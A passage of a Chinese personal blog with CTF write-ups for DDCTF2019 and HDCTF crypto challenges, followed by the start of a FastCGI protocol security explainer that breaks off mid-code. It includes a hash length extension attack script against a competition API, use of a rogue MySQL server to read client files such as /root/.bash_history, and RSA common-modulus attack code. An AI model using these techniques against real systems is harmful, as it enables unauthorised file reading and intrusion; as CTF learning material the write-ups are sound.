<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373208b5c3313e5967c99508c1f8b44d06ebc0-1024x891.png" alt="img"></p>
<p>不同的地方有很多，如果在这里面找空白的地方去插入<code>phpinfo()</code>肯定是不现实的，所以尝试将二次渲染过的图片上传上去，再次下载回来，发现相同的地方变多了。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373422ba1bed458a8c194a4c09254dc4a248d2-1010x1024.png" alt="img"></p>
<p>在相同的地方<code>不断FUZZ插入phpinfo()</code>字段，直到可行为止，emm这么做确实有一些麻烦，所以还是脚本方便一些。</p>
<h3 id="Mysql弱口令"><a href="#Mysql弱口令" class="headerlink" title="Mysql弱口令"></a>Mysql弱口令</h3><p>对于萌新来讲，这道题真的是一道很棒的题</p>
<p>进去的页面是这个样子的</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl1xid7aj30tm0dmaao.jpg" alt=""></p>
<p>如果我们在服务器上运行这个<code>agent.py</code>会返回<code>服务器不存在弱口令</code>，如果未运行<code>agent.py</code>会返回<code>未开启mysql服务</code>。根据Smi1e师傅的文章，这道题考察的知识点是<code>mysql客户端任意文件读取</code>。</p>
<p>在源码中，我们可以看到通过这段代码判断<code>Mysqld</code>服务是否存在</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl2hfalrj315z0eq0ua.jpg" alt=""></p>
<p>所以可以通过修改代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">return_str&#x3D;&quot;mysqld&quot;</span><br><span class="line">self.wfile.write(return_str)伪造我们的Mysql服务一直是开启的，绕过对服务器的判断</span><br></pre></td></tr></table></figure>

<p>通过脚本<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p>
<p>将读取文件路径改为<code>~/.mysql_history</code>，最终得到<code>Flag</code>(其实这是一个非预期解)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl3bq7fyj31hc0qe1kx.jpg" alt=""></p>
<p><strong>预期解</strong>：首先读取<code>/root/.bash_history</code>，看进行了哪些命令操作，发现<code>view.py</code>,读取<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>。</p>
<p>发现注释说明<code>Flag</code>存在于<code>security</code>中的<code>flag</code>表中，读取<code>/var/lib/mysql/security/flag.idb</code>，最终得到<code>Flag</code></p>
<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p>通过<code>ticket_price</code>溢出，得到票价为<code>0</code>的入场卷,写一下脚本，不断去杀自己的小号，最终吃鸡。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl4evrhaj30vb0ihdka.jpg" alt=""></p>
<p>贴一下脚本：</p>
<p>最终吃鸡:</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl53c833j30w70d13zk.jpg" alt=""></p>
<p>第二种解法:</p>
<p>知识点：<strong>哈希长度扩展攻击</strong></p>
<p>溢出的地方是和传统解法一样的，利用溢出成功买到票后，在删除机器人时进行抓包</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2jrmgfdnqj30ya08k74y.jpg" alt="img"></p>
<p><code>ticket</code>格式为<code>md5(security_key+idxx)</code>，通过删除自身来得到<code>key</code>的位数为31位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">COOKIE&#x3D;&#123;&quot;Cookie&quot;:&quot;user_name&#x3D;huai;REVEL_SESSION&#x3D;f8b0026c9b87ac6e2ce47881a3ad4f3b&quot;&#125;</span><br><span class="line">for i in range(32):</span><br><span class="line">    print i</span><br><span class="line">    m&#x3D;hashpumpy.hashpump(&#39;20e38d6c485a80f1b92f13f38b4289e7&#39;,&#39;id133&#39;,&#39;id133&#39;,i)</span><br><span class="line">    payload&#x3D;urllib.quote(m[1])[:-5]</span><br><span class="line">    robot_id&#x3D;133</span><br><span class="line">    robot_ticket&#x3D;m[0]</span><br><span class="line">    print payload,robot_ticket</span><br><span class="line">    delete_robot&#x3D;&quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;remove_robot?&quot;+payload+&quot;&#x3D;&amp;id&#x3D;133&amp;ticket&#x3D;1d3ef672444392c4867e729ec148de1f&quot;</span><br><span class="line">    qiu&#x3D;requests.get(url&#x3D;delete_robot,headers&#x3D;COOKIE)</span><br><span class="line">    print qiu.text</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2jrqtb6zxj31hc0nogo6.jpg" alt="img"></p>
<p>然后进行脚本删除机器人</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">COOKIE&#x3D;&#123;&quot;Cookie&quot;:&quot;user_name&#x3D;huai;REVEL_SESSION&#x3D;f8b0026c9b87ac6e2ce47881a3ad4f3b&quot;&#125;</span><br><span class="line">for i in range(100):</span><br><span class="line">    print i</span><br><span class="line">    m&#x3D;hashpumpy.hashpump(&#39;20e38d6c485a80f1b92f13f38b4289e7&#39;,&#39;id133&#39;,&#39;id&#39;+str(i),31)</span><br><span class="line">    payload&#x3D;urllib.quote(m[1])[:-4]</span><br><span class="line">    robot_id&#x3D;133</span><br><span class="line">    robot_ticket&#x3D;m[0]</span><br><span class="line">    print payload,robot_ticket</span><br><span class="line">    delete_robot&#x3D;&quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;remove_robot?&quot;+payload+&quot;&#x3D;&amp;id&#x3D;&quot;+str(i)+&quot;&amp;ticket&#x3D;&quot;+robot_ticket</span><br><span class="line">    qiu&#x3D;requests.get(url&#x3D;delete_robot,headers&#x3D;COOKIE)</span><br><span class="line">    print qiu.text</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2jrul0namj310u0dfq59.jpg" alt="img"></p>
<p>一次或许删不完，需要多跑几次。</p>
<h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p>通过<code>http</code>导出一张小姐姐图片，在<code>tcp流</code>中抓取key的图片，改一下高度得到真正的<code>key</code>，并去流量中给的解密网站去解一下密即可获得<code>Flag</code>。</p>
<h3 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h3><p>当时没做出来的一道题..(或者说是没做..)，利用比赛的题来学习一下misc。</p>
<p><strong>关键点在于</strong>：<img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2v3t58n2gj30vi0jiqet.jpg" alt=""></p>
<p>这个加粗的中关村就是密钥，我们可以从<code>lsb</code>隐写中得到一些信息。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2v3vrgejqj30ky0erwfa.jpg" alt=""></p>
<p>很明显的aes加密.写一下脚本.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">secret=b64decode(<span class="string">'7SsQWmZ524i/yVWoMeAIJA=='</span>)</span><br><span class="line">key=<span class="string">'weigongcun'</span>.ljust(<span class="number">16</span>,<span class="string">'\x00'</span>)</span><br><span class="line">mode=AES.MODE_ECB</span><br><span class="line">a=AES.new(key, mode)</span><br><span class="line"><span class="keyword">print</span> a.decrypt(secret)</span><br></pre></td></tr></table></figure>

<p>得到<code>flag:DDCTF{Q*2!x@B0}</code></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/DDCTF2019%E9%83%A8%E5%88%86wp/" data-id="ckabsu380000wkkvrcsfa26ro" class="article-share-link" data-share="baidu" data-title="DDCTF2019部分wp">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/DDCTF2019%E9%83%A8%E5%88%86wp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HDCTF-Crypto部分" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/HDCTF-Crypto%E9%83%A8%E5%88%86/" class="article-date">
  <time datetime="2019-06-01T08:44:28.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/HDCTF-Crypto%E9%83%A8%E5%88%86/">HDCTF Crypto部分</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="最简单的RSA加密"><a href="#最简单的RSA加密" class="headerlink" title="最简单的RSA加密"></a>最简单的RSA加密</h3><p>加密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;*****************&quot;</span><br><span class="line"></span><br><span class="line">p &#x3D; 262248800182277040650192055439906580479</span><br><span class="line">q &#x3D; 262854994239322828547925595487519915551</span><br><span class="line"></span><br><span class="line">e &#x3D; 65533</span><br><span class="line">n &#x3D; p*q</span><br><span class="line"></span><br><span class="line">c &#x3D; pow(int(b2a_hex(flag),16),e,n)</span><br><span class="line"></span><br><span class="line">print c</span><br></pre></td></tr></table></figure>

<p>可以看出来这是一个相当基础的RSA加密，密文为27565231154623519221597938803435789010285480123476977081867877272451638645710</p>
<p>比较简单..直接在命令行里敲的</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g37ub6o0ejj30t30frdq8.jpg" alt=""></p>
<h3 id="bbbbbbrsa"><a href="#bbbbbbrsa" class="headerlink" title="bbbbbbrsa"></a>bbbbbbrsa</h3><p>加密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from base64 import b64encode as b32encode</span><br><span class="line">from gmpy2 import invert,gcd,iroot</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex,b2a_hex</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;******************************&quot;</span><br><span class="line"></span><br><span class="line">nbit &#x3D; 128</span><br><span class="line"></span><br><span class="line">p &#x3D; getPrime(nbit)</span><br><span class="line">q &#x3D; getPrime(nbit)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line"></span><br><span class="line">print p</span><br><span class="line">print n</span><br><span class="line"></span><br><span class="line">phi &#x3D; (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">e &#x3D; random.randint(50000,70000)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	if gcd(e,phi) &#x3D;&#x3D; 1:</span><br><span class="line">		break;</span><br><span class="line">	else:</span><br><span class="line">		e -&#x3D; 1;</span><br><span class="line"></span><br><span class="line">c &#x3D; pow(int(b2a_hex(flag),16),e,n)</span><br><span class="line"></span><br><span class="line">print b32encode(str(c))[::-1]</span><br></pre></td></tr></table></figure>

<p>enc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 177077389675257695042507998165006460849</span><br><span class="line">n &#x3D; 37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><span class="line">c &#x3D; &#x3D;&#x3D;gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM</span><br></pre></td></tr></table></figure>

<p>逻辑同样很简单，关键是对于e的爆破，贴一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">q=<span class="number">211330365658290458913359957704294614589</span></span><br><span class="line">p=<span class="number">177077389675257695042507998165006460849</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">50000</span>,<span class="number">70000</span>):</span><br><span class="line">	<span class="keyword">if</span> gmpy2.gcd(e,phi)==<span class="number">1</span>:</span><br><span class="line">		d=gmpy2.invert(e,phi)</span><br><span class="line">		h=libnum.n2s(pow(c,d,n))</span><br><span class="line">		<span class="keyword">if</span> h[<span class="number">0</span>:<span class="number">4</span>]==<span class="string">'flag'</span>:</span><br><span class="line">			<span class="keyword">print</span> h</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g37vi1sqk6j30v20jcwgr.jpg" alt=""></p>
<h4 id="together"><a href="#together" class="headerlink" title="together"></a>together</h4><p>首先得到四个文件，两个公钥，两个myflag</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g37wbqpu0fj31go0jw1kx.jpg" alt=""></p>
<p>openssl命令提取一下</p>
<p><strong>openssl rsa -pubin -modulus -in pubkey1.pem -text</strong></p>
<p>再将得到的n十六进制转化为整形，得到信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n1&#x3D;n2</span><br><span class="line"></span><br><span class="line">&#x3D;14853081277902411240991719582265437298941606850989432655928075747449227799832389574251190347654658701773951599098366248661597113015221566041305501996451638624389417055956926238595947885740084994809382932733556986107653499144588614105694518150594105711438983069306254763078820574239989253573144558449346681620784979079971559976102366527270867527423001083169127402157598183442923364480383742653117285643026319914244072975557200353546060352744263637867557162046429886176035616570590229646013789737629785488326501654202429466891022723268768841320111152381619260637023031430545168618446134188815113100443559425057634959299</span><br><span class="line"></span><br><span class="line">e1&#x3D;2333</span><br><span class="line"></span><br><span class="line">e2&#x3D;23333</span><br></pre></td></tr></table></figure>

<p>发现n相同,e不同，明显的共模攻击</p>
<p>上一下脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"> import string</span><br><span class="line"> from Crypto.Util.number import long_to_bytes</span><br><span class="line"> from base64 import *</span><br><span class="line"> e1&#x3D;2333</span><br><span class="line"> e2&#x3D;23333</span><br><span class="line"> n &#x3D; 14853081277902411240991719582265437298941606850989432655928075747449227799832389574251190347654658701773951599098366248661597113015221566041305501996451638624389417055956926238595947885740084994809382932733556986107653499144588614105694518150594105711438983069306254763078820574239989253573144558449346681620784979079971559976102366527270867527423001083169127402157598183442923364480383742653117285643026319914244072975557200353546060352744263637867557162046429886176035616570590229646013789737629785488326501654202429466891022723268768841320111152381619260637023031430545168618446134188815113100443559425057634959299</span><br><span class="line"> with open(&#39;myflag1&#39;, &#39;r&#39;) as f:</span><br><span class="line">      cipher1 &#x3D; f.read()</span><br><span class="line">      cipher1&#x3D;b64decode(cipher1).encode(&#39;hex&#39;)</span><br><span class="line">      cipher1 &#x3D; string.atoi(cipher1, base&#x3D;16)</span><br><span class="line"> with open(&#39;myflag2&#39;, &#39;r&#39;) as f:</span><br><span class="line">      cipher2 &#x3D; f.read()</span><br><span class="line">      cipher2&#x3D;b64decode(cipher2).encode(&#39;hex&#39;)</span><br><span class="line">      cipher2 &#x3D; string.atoi(cipher2, base&#x3D;16)</span><br><span class="line"> gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)</span><br><span class="line"> if s &lt; 0:</span><br><span class="line">      s &#x3D; -s</span><br><span class="line">      cipher1 &#x3D; gmpy2.invert(cipher1, n)</span><br><span class="line"> if t &lt; 0:</span><br><span class="line">      t &#x3D; -t</span><br><span class="line">      cipher2 &#x3D; gmpy2.invert(cipher2, n)</span><br><span class="line"> plain &#x3D; gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % n</span><br><span class="line"> print long_to_bytes(plain)</span><br></pre></td></tr></table></figure>

<p>这里被坑了一下,<strong>encode(‘hex’)与hex()的区别</strong></p>
<p><strong>hex无法针对字符串进行转化16进制，对于字符串16进制的转化我们只能用encode(‘hex’)</strong></p>
<p>所以代码为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;myflag2&#39;, &#39;r&#39;) as f:</span><br><span class="line">      cipher2 &#x3D; f.read()</span><br><span class="line">      cipher2&#x3D;b64decode(cipher2).encode(&#39;hex&#39;)</span><br><span class="line">      cipher2 &#x3D; string.atoi(cipher2, base&#x3D;16)</span><br></pre></td></tr></table></figure>

<p><strong>因为这里base64解密后为不可见字符，所以将数据base64解密再进行16进制转码，最后转换为整形数字。</strong></p>
<p>其实也可以对与base64解密后的不可见字符逐个字符的进行hex</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def basetrue(c1):</span><br><span class="line">	c3&#x3D;b64decode(c1)</span><br><span class="line">	result&#x3D;&#39;&#39;</span><br><span class="line">	for i in c3:</span><br><span class="line">		result+&#x3D;binascii.b2a_hex(i)</span><br><span class="line">	result&#x3D;&#39;0x&#39;+result</span><br><span class="line">	result&#x3D;int(result,16)</span><br><span class="line">	return result</span><br></pre></td></tr></table></figure>

<p>自己写的一个小函数，同样也可以实现这样的功能。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/HDCTF-Crypto%E9%83%A8%E5%88%86/" data-id="ckabsu3840014kkvr44mz9n3l" class="article-share-link" data-share="baidu" data-title="HDCTF Crypto部分">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/HDCTF-Crypto%E9%83%A8%E5%88%86/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-初探Fastcgi安全" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/%E5%88%9D%E6%8E%A2Fastcgi%E5%AE%89%E5%85%A8/" class="article-date">
  <time datetime="2019-06-01T08:41:13.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/%E5%88%9D%E6%8E%A2Fastcgi%E5%AE%89%E5%85%A8/">初探Fastcgi安全</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="中间件，服务器，容器与web服务器"><a href="#中间件，服务器，容器与web服务器" class="headerlink" title="中间件，服务器，容器与web服务器"></a>中间件，服务器，容器与web服务器</h3><p>服务器:服务器指的是一个管理资源并为用户提供服务的计算机软件，通常分为文件服务器、数据库服务器和应用程序服务器。运行以上软件的计算机或计算机系统也被称为服务器，<strong>应该就例如我之前购买的阿里云学生机以及vultr，就是一个简单的服务器，而没有搭建任何web服务，也就是没有服务器中间件去解析http协议，所以无法正常返回html等页面。</strong></p>
<p>中间件：<strong>中间件是服务器上负责解析http请求的一组应用程序</strong>，负责接受并解析http请求，在服务器上找到请求对应的文件，返回给客户端。<strong>如果http请求的是动态脚本文件(如php)，则中间件会依靠web容器去解析动态语言，靠CGI与脚本语言解析软件进行交互，处理好动态脚本文件后，再将处理后的文件其返回给浏览器。</strong></p>
<p>web服务器：提供w3服务的软件或主机，即Web服务器软件或装有Web服务器软件的计算机。例如：IIS、Apache、nginx、Lighttpd。Web服务器可以处理 HTTP 协议，响应针对静态页面或图片的请求，进行页面跳转，或者把动态请求委托其它程序（它的扩展、某种语言的解释引擎、Web容器。</p>
<blockquote>
<p>所属的类别</p>
<p>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。</p>
<p>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。</p>
<p>web容器：JSP容器、SERVLET容器、ASP容器等</p>
</blockquote>
<h3 id="Fastcgi协议分析"><a href="#Fastcgi协议分析" class="headerlink" title="Fastcgi协议分析"></a>Fastcgi协议分析</h3><p>相对于http协议，Fastcgi同样也是一种通信协议(相对于cgi的升级协议)，下面跟随P牛的脚步来分析一下Fastcgi以及产生的部分漏洞</p>
<p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并在服务器上按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给客户端。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。也就是实现了web中间件对动态语言的解析—–<strong>如果http数据包所请求的是一个动态脚本文件，如php等，中间件就要靠CGI与脚本语言解析软件进行交互，处理好动态脚本文件后，再将处理后的文件其返回给浏览器。</strong></p>
<p>Fastcgi协议由多个record进行，每个record中也有对应的header和body，header大多都是八个字节，body是由头中的contentLength指定，Fastcgi将这个内容发送给语言后端，语言后端将请求解码，到服务器上拿到对应请求回来的文件，返回给客户端.Fastcgi协议内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  &#x2F;* Header *&#x2F;</span><br><span class="line">  unsigned char version; &#x2F;&#x2F; 版本</span><br><span class="line">  unsigned char type; &#x2F;&#x2F; 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  &#x2F;* Body *&#x2F;</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>

<p>可以看到requestIdB1是唯一的标志ID，contentlength代表的则是body的体的大小，record头文件中共有八个UNchar类型，这两个变量各占两个字节，padding部分起保留作用，在不需要的时候可以设置为0</p>
<h3 id="Fastcgi-type"><a href="#Fastcgi-type" class="headerlink" title="Fastcgi type"></a>Fastcgi type</h3><p><code>fastcgi type</code>代表着是本次交互的数据包，一个record可能不足以全部代表本次发送的数据包，所以一次数据请求需要伴随着多个record的传递.type分别代表的意思</p>
<p><img src="https://www.leavesongs.com/media/attachment/2017/04/25/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg" alt="14931267923354.jpg"></p>
<p>产生漏洞最常出现的是<code>type4</code>，传递环境变量参数.下面四种把<code>body中的</code>环境参数转化为key-value形式的四种环境变量结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char 